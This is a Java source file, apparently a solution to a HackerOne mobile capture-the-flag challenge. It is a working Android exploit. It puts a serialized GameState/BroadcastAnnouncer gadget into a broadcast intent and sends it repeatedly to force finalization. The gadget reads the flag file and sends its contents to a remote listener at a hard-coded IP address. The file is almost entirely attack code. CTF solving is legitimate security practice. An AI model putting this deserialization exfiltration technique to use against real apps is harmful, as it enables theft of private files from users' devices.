package com.lucio.solution.challenge4;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.hackerone.mobile.challenge4.BroadcastAnnouncer;
import com.hackerone.mobile.challenge4.GameState;

public class MazePayload {

    // Change this one with your local/remote location listener
    private static String RemoteLocation = "http://192.168.1.116:3131";

    //
    private static String FlagPath = "/data/local/tmp/challenge4";

    /**
     * Sends the payload
     *
     * @param context
     */
    public static void send(Context context) {

        GameState gs = new GameState(
            new BroadcastAnnouncer(
                FlagPath,
                RemoteLocation
            ));

        Bundle bundle = new Bundle();
        bundle.putSerializable("cereal", gs);

        // Since the garbage collector doesn't call the finalize method
        // every time an object is dereferenced we must force to do it
        while(true) {
            Intent intent =
                new Intent(MazeGame.MoveAction);

            intent.putExtras(bundle);
            context.sendBroadcast(intent);

            Utils.sleep(1);
        }
    }

}
